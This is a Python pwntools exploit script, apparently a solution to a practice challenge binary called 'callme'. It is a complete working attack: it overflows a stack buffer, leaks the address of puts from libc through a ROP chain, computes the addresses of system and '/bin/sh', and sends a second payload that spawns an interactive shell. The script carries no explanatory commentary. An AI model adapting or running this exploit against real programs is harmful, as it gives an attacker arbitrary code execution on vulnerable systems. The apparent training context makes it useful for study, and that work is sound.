from pwn import *

elf = context.binary = ELF("./callme")

PUTS_PLT = elf.plt["puts"]
PUTS_GOT = elf.got["puts"]

START = elf.symbols._start

POP_RDI_GADGET = p64(0x4009a3)

libc = elf.libc

LIBC_SYSTEM = libc.sym["system"]
LIBC_PUTS = libc.sym["puts"]
LIBC_BINSH = next(libc.search(b"/bin/sh"))

payload1 = b'A' * 40

# pop the address of puts on the got into rdi
payload1 += POP_RDI_GADGET
payload1 += p64(PUTS_GOT)
# call puts
payload1 += p64(PUTS_PLT)
# call start
payload1 += p64(START)

conn = process()

conn.recvuntil(b'> ')

print(">>> sending payload 1")
conn.send(payload1)

conn.recvuntil(b"Thank you!\n")
# bit of a hack but it works
puts_addr = u64(conn.recv(6) + b'\x00\x00')
print(">>> received libc_puts address %s" % hex(puts_addr))

libc_leak = puts_addr - LIBC_PUTS
print(">>> libc leaked address is %s" % hex(libc_leak))
libc_system_leak = libc_leak + LIBC_SYSTEM
print(">>> calculated system address is %s" % hex(libc_system_leak))
libc_binsh_leak = libc_leak + LIBC_BINSH
print(">>> calculated /bin/sh address is %s" % hex(libc_binsh_leak))

payload2 = b'A' * 40
payload2 += POP_RDI_GADGET
payload2 += p64(libc_binsh_leak)
payload2 += p64(libc_system_leak)

conn.recvuntil(b'> ')

print(">>> sending payload 2")
conn.send(payload2)

conn.interactive()
